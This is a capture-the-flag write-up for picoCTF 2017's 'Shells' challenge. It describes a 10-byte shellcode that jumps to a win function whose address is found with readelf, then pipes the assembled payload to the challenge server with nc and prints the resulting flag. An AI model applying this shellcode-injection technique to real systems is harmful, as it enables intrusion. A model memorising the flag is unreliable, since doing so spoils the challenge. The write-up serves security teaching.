# Shells

> How much can a couple bytes do? Use shells! Source. Connect on shell2017.picoctf.com:55049.

Hints:

> Read about basic shellcode

> You don't need a full shell (yet...), just enough to get the flag

This time we can input only 10 bytes and we can't find any working execve shellcode of this length. However in the source we can see there's a function called win which prints us content of flag.txt.
We can jump to this function. To do this we can write it's address on the stack and then use `ret` which will 'return' to the address on the top of the stack.
To find out the address we can use `readelf` tool.
```
$ readelf shells -s
... (a lot of data)
    63: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    64: 08048670    97 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    65: 08048540    24 FUNC    GLOBAL DEFAULT   13 win
    66: 08049a68     0 NOTYPE  GLOBAL DEFAULT   25 _end
    67: 08048440     0 FUNC    GLOBAL DEFAULT   13 _start
... (a lot of data)
```

65th entry is our win function and `08048540` is it's address.
Now we can create the [payload](payload.asm) and connect to the server.

```
$ nasm payload.asm
$ cat payload | nc shell2017.picoctf.com 55049
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
790fe1a8c59ae1e7607273ace0014dfc
```

The flag is `790fe1a8c59ae1e7607273ace0014dfc`.